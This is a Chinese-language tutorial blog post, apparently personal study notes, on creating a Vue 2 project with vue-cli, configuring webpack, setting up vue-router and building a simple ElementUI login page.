<p>预先定义好的目录结构及基础代码，就好比咱们在创建Maven项目时可以选择创建一个骨架项目，这个估计项目就是脚手架，我们的开发更加的快速；</p>
<p><strong>项目的功能</strong></p>
<ul>
<li>统一的目录结构</li>
<li>本地调试</li>
<li>热部署</li>
<li>单元测试</li>
<li>集成打包上线</li>
</ul>
<p>类似创建maven架构的项目</p>
<h3 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h3><p>环境需要Node.js</p>
<p>需要安装node.js 和 git</p>
<p>我电脑又就不演示了</p>
<p>新版本安装vue-cli  详细参考官方文档<br><figure class="highlight coffeescript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">npm</span> install -g @vue/cli</span><br><span class="line"></span><br><span class="line"><span class="comment">#测试是否安装成功#查看可以基于哪些模板创建vue应用程序，通常我们选择webpack</span></span><br><span class="line"></span><br><span class="line">vue --version <span class="comment">#验证安装成功</span></span><br></pre></td></tr></table></figure><br>如果需要升级全局的Vue-cli<br><figure class="highlight coffeescript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">npm</span> update -g @vue/cli</span><br></pre></td></tr></table></figure><br>这种方法是Vue 2.*版本的</p>
<p><a href="https://cli.vuejs.org/zh/guide/creating-a-project.html#%E4%BD%BF%E7%94%A8%E5%9B%BE%E5%BD%A2%E5%8C%96%E7%95%8C%E9%9D%A2" target="_blank" rel="noopener">官方文档</a><br>查看官方文档可以看到Vue3的 因为初学者 我还是跟着视频走Vue2.* 以后再研究Vue 3</p>
<h3 id="创建第一个vue-cli"><a href="#创建第一个vue-cli" class="headerlink" title="创建第一个vue-cli"></a>创建第一个vue-cli</h3><p>切到你想要创建的目录下<br>执行<br><figure class="highlight vala"><table><tr><td class="code"><pre><span class="line"><span class="meta">#1、首先需要进入到对应的目录 cd D:\Project\vue-study</span></span><br><span class="line"><span class="meta">#2、这里的myvue是顶日名称，可以根据自己的需求起名</span></span><br><span class="line">vue init webpack myvue</span><br></pre></td></tr></table></figure><br>一路选No就行</p>
<ul>
<li><p><strong>说明：</strong></p>
<ul>
<li><p>Project name：项目名称，默认回车即可</p>
</li>
<li><p>Project description：项目描述，默认回车即可</p>
</li>
<li><p>Author：项目作者，默认回车即可</p>
</li>
<li><p>Install vue-router：是否安装vue-router，选择n不安装（后期需要再手动添加）</p>
</li>
<li><p>Use ESLint to lint your code:是否使用ESLint做代码检查，选择n不安装（后期需要再手动添加)</p>
</li>
<li><p>Set up unit tests:单元测试相关，选择n不安装（后期需要再手动添加）</p>
</li>
<li><p>Setupe2etests with Nightwatch：单元测试相关，选择n不安装（后期需要再手动添加）</p>
</li>
<li><p>Should we run npm install for you after the,project has been created:创建完成后直接初始化，选择n，我们手动执行；运行结果！</p>
</li>
</ul>
</li>
</ul>
<p><img src="/img/Vue/Vue-cli-0.png" alt="avatar"></p>
<p>创建完成后可以看到目录下多了很多东西</p>
<p>使用<code>npm run dev</code>运行Vue</p>
<p><img src="/img/Vue/Vue-cli-1.png" alt="avatar"></p>
<p>同时访问localhost:8080 就能看到Vue的界面<br><img src="/img/Vue/Vue-cli-2.png" alt="avatar"></p>
<h2 id="webpack使用"><a href="#webpack使用" class="headerlink" title="webpack使用"></a>webpack使用</h2><h3 id="安装Webpack"><a href="#安装Webpack" class="headerlink" title="安装Webpack"></a>安装Webpack</h3><p>WebPack是一款模块加载器兼打包工具， 它能把各种资源， 如JS、JSX、ES 6、SASS、LESS、图片等都作为模块来处理和使用。</p>
<p><strong>安装：</strong></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">npm install webpack -g</span><br><span class="line">npm install webpack-cli -g</span><br></pre></td></tr></table></figure>
<p>测试安装成功</p>
<ul>
<li><p><code>webpack -v</code></p>
</li>
<li><p><code>webpack-cli -v</code></p>
</li>
</ul>
<h4 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h4><p>创建 <code>webpack.config.js</code>配置文件</p>
<ul>
<li>entry：入口文件， 指定Web Pack用哪个文件作为项目的入口</li>
<li>output：输出， 指定WebPack把处理完成的文件放置到指定路径</li>
<li>module：模块， 用于处理各种类型的文件</li>
<li>plugins：插件， 如：热更新、代码重用等</li>
<li>resolve：设置路径指向</li>
<li>watch：监听， 用于设置文件改动后直接打包</li>
</ul>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">	entry:<span class="string">""</span>,</span><br><span class="line">	output:&#123;</span><br><span class="line">		path:<span class="string">""</span>,</span><br><span class="line">		filename:<span class="string">""</span></span><br><span class="line">	&#125;,</span><br><span class="line">	<span class="built_in">module</span>:&#123;</span><br><span class="line">		loaders:[</span><br><span class="line">			&#123;<span class="attr">test</span>:<span class="regexp">/\.js$/</span>,;\loade:<span class="string">""</span>&#125;</span><br><span class="line">		]</span><br><span class="line">	&#125;,</span><br><span class="line">	plugins:&#123;&#125;,</span><br><span class="line">	resolve:&#123;&#125;,</span><br><span class="line">	watch:<span class="literal">true</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>直接运行<code>webpack</code>命令打包</p>
<h3 id="使用webpack"><a href="#使用webpack" class="headerlink" title="使用webpack"></a>使用webpack</h3><ol>
<li><p>创建项目</p>
</li>
<li><p>创建一个名为modules的目录，用于放置JS模块等资源文件</p>
</li>
<li><p>在modules下创建模块文件，如hello.js，用于编写JS模块相关代码</p>
</li>
</ol>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//暴露一个方法：sayHi</span></span><br><span class="line">exports.sayHi = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	<span class="built_in">document</span>.write(<span class="string">"&lt;div&gt;Hello Webpack&lt;/div&gt;"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>1.在modules下创建一个名为main.js的入口文件，用于打包时设置entry属性</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//require 导入一个模块，就可以调用这个模块中的方法了</span></span><br><span class="line"><span class="keyword">var</span> hello = <span class="built_in">require</span>(<span class="string">"./hello"</span>);</span><br><span class="line">hello.sayHi();</span><br></pre></td></tr></table></figure>
<p>2.在项目目录下创建webpack.config.js配置文件，使用webpack命令打包</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">	entry:<span class="string">"./modules/main.js"</span>,</span><br><span class="line">	output:&#123;</span><br><span class="line">		filename:<span class="string">"./js/bundle.js"</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>3.在项目目录下创建HTML页面，如index.html，导入webpack打包后的JS文件</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!doctype html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">title</span>&gt;</span>狂神说Java<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"dist/js/bundle.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<ol>
<li><p>在IDEA控制台中直接执行webpack；如果失败的话，就使用管理员权限运行即可！</p>
</li>
<li><p>运行HTML看效果</p>
</li>
</ol>
<p><strong>说明</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 参数--watch 用于监听变化</span></span><br><span class="line">webpack --watch</span><br></pre></td></tr></table></figure>
<h2 id="vue-router路由"><a href="#vue-router路由" class="headerlink" title="vue-router路由"></a>vue-router路由</h2><h3 id="说明-1"><a href="#说明-1" class="headerlink" title="说明"></a>说明</h3><p>学习的时候，尽量的打开官方的文档</p>
<p>Vue Router是Vue.js官方的路由管理器。它和Vue.js的核心深度集成， 让构建单页面应用变得易如反掌。包含的功能有：</p>
<ul>
<li>嵌套的路由/视图表</li>
<li>模块化的、基于组件的路由配置</li>
<li>路由参数、查询、通配符</li>
<li>基于Vue js过渡系统的视图过渡效果</li>
<li>细粒度的导航控制</li>
<li>带有自动激活的CSS class的链接</li>
<li>HTML5 历史模式或hash模式， 在IE 9中自动降级</li>
<li>自定义的滚动行为</li>
</ul>
<h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p><strong>基于第一个<code>vue-cli</code>进行测试学习； 先查看node modules中是否存在vue-router</strong></p>
<p>vue-router是一个插件包， 所以我们还是需要用n pm/cn pm来进行安装的。打开命令行工具，进入你的项目目录，输入下面命令。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">npm install vue-router --save-dev</span><br></pre></td></tr></table></figure>
<p>如果在一个模块化工程中使用它，必须要通过Vue.use()明确地安装路由功能：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">import Vue from 'vue'</span><br><span class="line">import VueRouter from 'vue-router'</span><br><span class="line"></span><br><span class="line">Vue.use(VueRouter);</span><br></pre></td></tr></table></figure>
<h3 id="测试-1"><a href="#测试-1" class="headerlink" title="测试"></a>测试</h3><p>1、先删除没有用的东西</p>
<p>2、<code>components</code> 目录下存放我们自己编写的组件</p>
<p>3、定义一个<code>Content.vue</code> 的组件</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">h1</span>&gt;</span>内容页<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">	<span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span><br><span class="line"><span class="actionscript">		name:<span class="string">"Content"</span></span></span><br><span class="line">	&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><code>Main.vue</code>组件</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">	<span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">h1</span>&gt;</span>首页<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">	<span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span><br><span class="line"><span class="actionscript">		name:<span class="string">"Main"</span></span></span><br><span class="line">	&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>4、安装路由，在src目录下，新建一个文件夹：<code>router</code>，专门存放路由，配置路由index.js，如下</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> Vue <span class="keyword">from</span><span class="string">'vue'</span></span><br><span class="line"><span class="comment">//导入路由插件</span></span><br><span class="line"><span class="keyword">import</span> Router <span class="keyword">from</span> <span class="string">'vue-router'</span></span><br><span class="line"><span class="comment">//导入上面定义的组件</span></span><br><span class="line"><span class="keyword">import</span> Content <span class="keyword">from</span> <span class="string">'../components/Content'</span></span><br><span class="line"><span class="keyword">import</span> Main <span class="keyword">from</span> <span class="string">'../components/Main'</span></span><br><span class="line"><span class="comment">//安装路由</span></span><br><span class="line">Vue.use(Router) ;</span><br><span class="line"><span class="comment">//配置路由</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="keyword">new</span> Router(&#123;</span><br><span class="line">	routes:[</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="comment">//路由路径</span></span><br><span class="line">			path:<span class="string">'/content'</span>,</span><br><span class="line">			<span class="comment">//路由名称</span></span><br><span class="line">			name:<span class="string">'content'</span>,</span><br><span class="line">			<span class="comment">//跳转到组件</span></span><br><span class="line">			component:Content</span><br><span class="line">			&#125;,&#123;</span><br><span class="line">			<span class="comment">//路由路径</span></span><br><span class="line">			path:<span class="string">'/main'</span>,</span><br><span class="line">			<span class="comment">//路由名称</span></span><br><span class="line">			name:<span class="string">'main'</span>,</span><br><span class="line">			<span class="comment">//跳转到组件</span></span><br><span class="line">			component:Main</span><br><span class="line">			&#125;</span><br><span class="line">		]</span><br><span class="line">	&#125;);</span><br></pre></td></tr></table></figure>
<p>5、在<code>main.js</code>中配置路由</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> Vue <span class="keyword">from</span> <span class="string">'vue'</span></span><br><span class="line"><span class="keyword">import</span> App <span class="keyword">from</span> <span class="string">'./App'</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//导入上面创建的路由配置目录</span></span><br><span class="line"><span class="keyword">import</span> router <span class="keyword">from</span> <span class="string">'./router'</span><span class="comment">//自动扫描里面的路由配置</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//来关闭生产模式下给出的提示</span></span><br><span class="line">Vue.config.productionTip = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> Vue(&#123;</span><br><span class="line">	el:<span class="string">"#app"</span>,</span><br><span class="line">	<span class="comment">//配置路由</span></span><br><span class="line">	router,</span><br><span class="line">	components:&#123;App&#125;,</span><br><span class="line">	template:<span class="string">'&lt;App/&gt;'</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p>6、在<code>App.vue</code>中使用路由</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"app"</span>&gt;</span></span><br><span class="line">		<span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">			router-link：默认会被渲染成一个&lt;a&gt;标签，to属性为指定链接</span></span><br><span class="line"><span class="comment">			router-view：用于渲染路由匹配到的组件</span></span><br><span class="line"><span class="comment">		--&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">router-link</span> <span class="attr">to</span>=<span class="string">"/"</span>&gt;</span>首页<span class="tag">&lt;/<span class="name">router-link</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">router-link</span> <span class="attr">to</span>=<span class="string">"/content"</span>&gt;</span>内容<span class="tag">&lt;/<span class="name">router-link</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">router-view</span>&gt;</span><span class="tag">&lt;/<span class="name">router-view</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">	<span class="keyword">export</span> <span class="keyword">default</span>&#123;</span></span><br><span class="line"><span class="actionscript">		name:<span class="string">'App'</span></span></span><br><span class="line">	&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="创建登录页面"><a href="#创建登录页面" class="headerlink" title="创建登录页面"></a>创建登录页面</h3><p>把没有用的初始化东西删掉！</p>
<p>在源码目录中创建如下结构：</p>
<ul>
<li>assets：用于存放资源文件</li>
<li>components：用于存放Vue功能组件</li>
<li>views：用于存放Vue视图组件</li>
<li>router：用于存放vue-router配置</li>
</ul>
<p><strong>创建首页视图，在views目录下创建一个名为Main.vue的视图组件：</strong></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">div</span>&gt;</span>首页<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">	<span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span><br><span class="line"><span class="actionscript">			name:<span class="string">"Main"</span></span></span><br><span class="line">	&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span> <span class="attr">scoped</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>创建登录页视图在views目录下创建名为Login.vue的视图组件，其中el-*的元素为ElementUI组件；</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">el-form</span> <span class="attr">ref</span>=<span class="string">"loginForm"</span> <span class="attr">:model</span>=<span class="string">"form"</span> <span class="attr">:rules</span>=<span class="string">"rules"</span> <span class="attr">label-width</span>=<span class="string">"80px"</span> <span class="attr">class</span>=<span class="string">"login-box"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">h3</span> <span class="attr">class</span>=<span class="string">"login-title"</span>&gt;</span>欢迎登录<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">el-form-item</span> <span class="attr">label</span>=<span class="string">"账号"</span> <span class="attr">prop</span>=<span class="string">"username"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">el-input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">placeholder</span>=<span class="string">"请输入账号"</span> <span class="attr">v-model</span>=<span class="string">"form.username"</span>/&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">el-form-item</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">el-form-item</span> <span class="attr">label</span>=<span class="string">"密码"</span> <span class="attr">prop</span>=<span class="string">"password"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">el-input</span> <span class="attr">type</span>=<span class="string">"password"</span> <span class="attr">placeholder</span>=<span class="string">"请输入密码"</span> <span class="attr">v-model</span>=<span class="string">"form.password"</span>/&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">el-form-item</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">el-form-item</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">el-button</span> <span class="attr">type</span>=<span class="string">"primary"</span> <span class="attr">v-on:click</span>=<span class="string">"onSubmit('loginForm')"</span>&gt;</span>登录<span class="tag">&lt;/<span class="name">el-button</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">el-form-item</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">el-form</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">el-dialog</span> <span class="attr">title</span>=<span class="string">"温馨提示"</span> <span class="attr">:visible.sync</span>=<span class="string">"dialogVisiable"</span> <span class="attr">width</span>=<span class="string">"30%"</span> <span class="attr">:before-close</span>=<span class="string">"handleClose"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">span</span>&gt;</span>请输入账号和密码<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">span</span> <span class="attr">slot</span>=<span class="string">"footer"</span> <span class="attr">class</span>=<span class="string">"dialog-footer"</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">el-button</span> <span class="attr">type</span>=<span class="string">"primary"</span> @<span class="attr">click</span>=<span class="string">"dialogVisible = false"</span>&gt;</span>确定<span class="tag">&lt;/<span class="name">el-button</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">el-dialog</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">  <span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span><br><span class="line"><span class="actionscript">    name: <span class="string">"Login"</span>,</span></span><br><span class="line">    data()&#123;</span><br><span class="line"><span class="actionscript">      <span class="keyword">return</span>&#123;</span></span><br><span class="line">        form:&#123;</span><br><span class="line"><span class="actionscript">          username:<span class="string">''</span>,</span></span><br><span class="line"><span class="actionscript">          password:<span class="string">''</span></span></span><br><span class="line">        &#125;,</span><br><span class="line"><span class="actionscript">        <span class="comment">//表单验证，需要在 el-form-item 元素中增加prop属性</span></span></span><br><span class="line">        rules:&#123;</span><br><span class="line">          username:[</span><br><span class="line"><span class="actionscript">            &#123;required:<span class="literal">true</span>,message:<span class="string">"账号不可为空"</span>,trigger:<span class="string">"blur"</span>&#125;</span></span><br><span class="line">          ],</span><br><span class="line">          password:[</span><br><span class="line"><span class="actionscript">            &#123;required:<span class="literal">true</span>,message:<span class="string">"密码不可为空"</span>,tigger:<span class="string">"blur"</span>&#125;</span></span><br><span class="line">          ]</span><br><span class="line">        &#125;,</span><br><span class="line"></span><br><span class="line"><span class="actionscript">        <span class="comment">//对话框显示和隐藏</span></span></span><br><span class="line"><span class="actionscript">        dialogVisible:<span class="literal">false</span></span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    methods:&#123;</span><br><span class="line">      onSubmit(formName)&#123;</span><br><span class="line"><span class="actionscript">        <span class="comment">//为表单绑定验证功能</span></span></span><br><span class="line"><span class="javascript">        <span class="keyword">this</span>.$refs[formName].validate(<span class="function">(<span class="params">valid</span>)=&gt;</span>&#123;</span></span><br><span class="line">          if(valid)&#123;</span><br><span class="line"><span class="actionscript">            <span class="comment">//使用vue-router路由到指定界面，该方式称为编程式导航</span></span></span><br><span class="line"><span class="actionscript">            <span class="keyword">this</span>.$router.push(<span class="string">'/main'</span>);</span></span><br><span class="line"><span class="actionscript">          &#125;<span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="actionscript">            <span class="keyword">this</span>.dialogVisible=<span class="literal">true</span>;</span></span><br><span class="line"><span class="actionscript">            <span class="keyword">return</span> <span class="literal">false</span>;</span></span><br><span class="line">          &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span> <span class="attr">lang</span>=<span class="string">"scss"</span> <span class="attr">scoped</span>&gt;</span></span><br><span class="line"><span class="css">  <span class="selector-class">.login-box</span>&#123;</span></span><br><span class="line"><span class="css">    <span class="selector-tag">border</span><span class="selector-pseudo">:1px</span> <span class="selector-tag">solid</span> <span class="selector-id">#DCDFE6</span>;</span></span><br><span class="line">    width: 350px;</span><br><span class="line"><span class="css">    <span class="selector-tag">margin</span><span class="selector-pseudo">:180px</span> <span class="selector-tag">auto</span>;</span></span><br><span class="line">    padding: 35px 35px 15px 35px;</span><br><span class="line">    border-radius: 5px;</span><br><span class="line">    -webkit-border-radius: 5px;</span><br><span class="line">    -moz-border-radius: 5px;</span><br><span class="line"><span class="css">    <span class="selector-tag">box-shadow</span>: 0 0 25<span class="selector-tag">px</span> <span class="selector-id">#909399</span>;</span></span><br><span class="line">  &#125;</span><br><span class="line"><span class="css">  <span class="selector-class">.login-title</span>&#123;</span></span><br><span class="line"><span class="css">    <span class="selector-tag">text-align</span><span class="selector-pseudo">:center</span>;</span></span><br><span class="line">    margin: 0 auto 40px auto;</span><br><span class="line"><span class="css">    <span class="selector-tag">color</span>: <span class="selector-id">#303133</span>;</span></span><br><span class="line">  &#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>创建路由，在router目录下创建一个名为<code>index.js</code>的vue-router路由配置文件</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//导入vue</span></span><br><span class="line"><span class="keyword">import</span> Vue <span class="keyword">from</span> <span class="string">'vue'</span>;</span><br><span class="line"><span class="keyword">import</span> VueRouter <span class="keyword">from</span> <span class="string">'vue-router'</span>;</span><br><span class="line"><span class="comment">//导入组件</span></span><br><span class="line"><span class="keyword">import</span> Main <span class="keyword">from</span> <span class="string">"../views/Main"</span>;</span><br><span class="line"><span class="keyword">import</span> Login <span class="keyword">from</span> <span class="string">"../views/Login"</span>;</span><br><span class="line"><span class="comment">//使用</span></span><br><span class="line">Vue.use(VueRouter);</span><br><span class="line"><span class="comment">//导出</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="keyword">new</span> VueRouter(&#123;</span><br><span class="line">  routes: [</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">//登录页</span></span><br><span class="line">      path: <span class="string">'/main'</span>,</span><br><span class="line">      component: Main</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="comment">//首页</span></span><br><span class="line">    &#123;</span><br><span class="line">      path: <span class="string">'/login'</span>,</span><br><span class="line">      component: Login</span><br><span class="line">    &#125;,</span><br><span class="line">  ]</span><br><span class="line"></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
<p>APP.vue</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"app"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">router-view</span>&gt;</span><span class="tag">&lt;/<span class="name">router-view</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="javascript"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span><br><span class="line"><span class="actionscript">  name: <span class="string">'App'</span>,</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="css"><span class="selector-id">#app</span> &#123;</span></span><br><span class="line">  font-family: 'Avenir', Helvetica, Arial, sans-serif;</span><br><span class="line">  -webkit-font-smoothing: antialiased;</span><br><span class="line">  -moz-osx-font-smoothing: grayscale;</span><br><span class="line">  text-align: center;</span><br><span class="line"><span class="css">  <span class="selector-tag">color</span>: <span class="selector-id">#2c3e50</span>;</span></span><br><span class="line">  margin-top: 60px;</span><br><span class="line">&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>main.js</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// The Vue build version to load with the `import` command</span></span><br><span class="line"><span class="comment">// (runtime-only or standalone) has been set in webpack.base.conf with an alias.</span></span><br><span class="line"><span class="keyword">import</span> Vue <span class="keyword">from</span> <span class="string">'vue'</span></span><br><span class="line"><span class="keyword">import</span> App <span class="keyword">from</span> <span class="string">'./App'</span></span><br><span class="line"><span class="keyword">import</span> router <span class="keyword">from</span> <span class="string">"./router"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> ElementUI <span class="keyword">from</span> <span class="string">'element-ui'</span></span><br><span class="line"><span class="keyword">import</span> <span class="string">'element-ui/lib/theme-chalk/index.css'</span></span><br><span class="line"></span><br><span class="line">Vue.use(router)</span><br><span class="line">Vue.use(ElementUI)</span><br><span class="line"></span><br><span class="line"><span class="comment">/* eslint-disable no-new */</span></span><br><span class="line"><span class="keyword">new</span> Vue(&#123;</span><br><span class="line">  el: <span class="string">'#app'</span>,</span><br><span class="line">  router,</span><br><span class="line">  render:<span class="function"><span class="params">h</span>=&gt;</span>h(App)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
<p>测试：在浏览器打开 <a href="http://localhost:8080/#/login" target="_blank" rel="noopener">http://localhost:8080/#/login</a><br>如果出现错误: 可能是因为sass-loader的版本过高导致的编译错误，当前最高版本是8.0.2，需要退回到7.3.1 ；<br>去package.json文件里面的 “sass-loader”的版本更换成7.3.1，然后重新cnpm install就可以了;</p>
